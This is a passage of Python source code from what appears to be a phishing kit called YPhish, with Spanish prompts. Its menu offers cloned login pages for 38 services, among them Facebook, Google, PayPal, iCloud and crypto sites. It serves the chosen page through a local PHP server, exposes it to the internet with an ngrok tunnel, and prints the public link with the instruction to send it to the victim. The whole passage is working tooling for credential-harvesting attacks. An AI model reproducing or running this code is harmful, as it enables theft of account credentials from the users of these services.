          11-Twitch          23-PornHub       35-Reddit
          12-Microsoft       24-Adobe         36-Subito.it""")
    option = input(Green+"Eleccion --> "+Reset)
    if option == '1':
        loadModule('Facebook')
        option2 = ''
        runPhishing('Facebook', option2)
    elif option == '2':
        loadModule('Google')
        option2 = ''
        runPhishing('Google', option2)
    elif option == '3':
        loadModule('LinkedIn')
        option2 = ''
        runPhishing('LinkedIn', option2)
    elif option == '4':
        loadModule('GitHub')
        option2 = ''
        runPhishing('GitHub', option2)
    elif option == '5':
        loadModule('StackOverflow')
        option2 = ''
        runPhishing('StackOverflow', option2)
    elif option == '6':
        loadModule('WordPress')
        option2 = ''
        runPhishing('WordPress', option2)
    elif option == '7':
        loadModule('Twitter')
        option2 = ''
        runPhishing('Twitter', option2)
    elif option == '8':
        loadModule('Instagram')
        option2 = ''
        runPhishing('Instagram', option2)
    elif option == '9':
        loadModule('Snapchat')
        option2 = ''
        runPhishing('Snapchat', option2)
    elif option == '10':
        loadModule('Yahoo')
        option2 = ''
        runPhishing('Yahoo', option2)
    elif option == '11':
        loadModule('Twitch')
        option2 = ''
        runPhishing('Twitch', option2)
    elif option == '12':
        loadModule('Microsoft')
        option2 = ''
        runPhishing('Microsoft', option2)
    elif option == '13':
        loadModule('Steam')
        option2 = ''
        runPhishing('Steam', option2)
    elif option == '14':
        loadModule('VK')
        option2 = ''
        runPhishing('VK', option2)
    elif option == '15':
        loadModule('iCloud')
        option2 = ''
        runPhishing('iCloud', option2)
    elif option == '16':
        loadModule('GitLab')
        option2 = ''
        runPhishing('GitLab', option2)
    elif option == '17':
        loadModule('NetFlix')
        option2 = ''
        runPhishing('NetFlix', option2)
    elif option == '18':
        loadModule('Origin')
        option2 = ''
        runPhishing('Origin', option2)
    elif option == '19':
        loadModule('Pinterest')
        option2 = ''
        runPhishing('Pinterest', option2)
    elif option == '20':
        loadModule('ProtonMail')
        option2 = ''
        runPhishing('ProtonMail', option2)
    elif option == '21':
        loadModule('Spotify')
        option2 = ''
        runPhishing('Spotify', option2)
    elif option == '22':
        loadModule('Quora')
        option2 = ''
        runPhishing('Quora', option2)
    elif option == '23':
        loadModule('PornHub')
        option2 = ''
        runPhishing('PornHub', option2)
    elif option == '24':
        loadModule('Adobe')
        option2 = ''
        runPhishing('Adobe', option2)
    elif option == '25':
        loadModule('Badoo')
        option2 = ''
        runPhishing('Badoo', option2)
    elif option == '26':
        loadModule('CryptoCurrency')
        option2 = ''
        runPhishing('CryptoCurrency', option2)
    elif option == '27':
        loadModule('DevianArt')
        option2 = ''
        runPhishing('DevianArt', option2)
    elif option == '28':
        loadModule('DropBox')
        option2 = ''
        runPhishing('DropBox', option2)
    elif option == '29':
        loadModule('eBay')
        option2 = ''
        runPhishing('eBay', option2)
    elif option == '30':
        loadModule('MySpace')
        option2 = ''
        runPhishing('Myspace', option2)
    elif option == '31':
        loadModule('PayPal')
        option2 = ''
        runPhishing('PayPal', option2)
    elif option == '32':
        loadModule('Shopify')
        option2 = ''
        runPhishing('Shopify', option2)
    elif option == '33':
        loadModule('Verizon')
        option2 = ''
        runPhishing('Verizon', option2)
    elif option == '34':
        loadModule('Yandex')
        option2 = ''
        runPhishing('Yandex', option2)
    elif option == '35':
        loadModule('Reddit')
        option2 = ''
        runPhishing('Reddit', option2)
    elif option == '36':
        loadModule('Subitoit')
        option2 = ''
        runPhishing('Subitoit', option2)
    elif option == '37':
        loadModule('PlayStation')
        option2 = ''
        runPhishing('PlayStation', option2)
    elif option == '38':
        loadModule('Xbox')
        option2 = ''
        runPhishing('Xbox', option2)
    elif option == '39':
        exit(0)

def runNgrok():
    os.system('./Server/ngrok http 1111 > /dev/null &')
    while True:
        time.sleep(2)
        os.system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z].*\.ngrok.io" --max-count=37 -oh > Server/Datos/ngrok.txt')
        urlFile = open('Server/Datos/ngrok.txt', 'r')
        url = urlFile.read()
        urlFile.close()
        if re.match("https://[0-9a-z].*\.ngrok.io", url) != None:
            print(""+Green+"\n [+] Url de Ngrok : " + url + "\n Pasale el link a la victima para el ataque \n")
            break
		
def runServer():
    os.system("cd Server/www/ && php -S 127.0.0.1:1111 > /dev/null 2>&1 &")

if __name__ == "__main__":
    try:
        check()
        time.sleep(1)
        banner()
        time.sleep(1)
        menu()
        opciones()
    except KeyboardInterrupt:
        choice = eval(input('\n\n{0}[1] {1}Return YPhish {0}[2] {1}Exit \n{2}YPhish >> {1}'.format(GREEN, DEFAULT, RED)))
        if choice == 1:
            os.system('cls && python3 YPhish.py')	
        elif choice == 2:
            time.sleep(2)
            exit(0)
        else:
            print(("\n{}[x] Opcion invalida.".format(RED)))
            time.sleep(2)	
            exit(0)
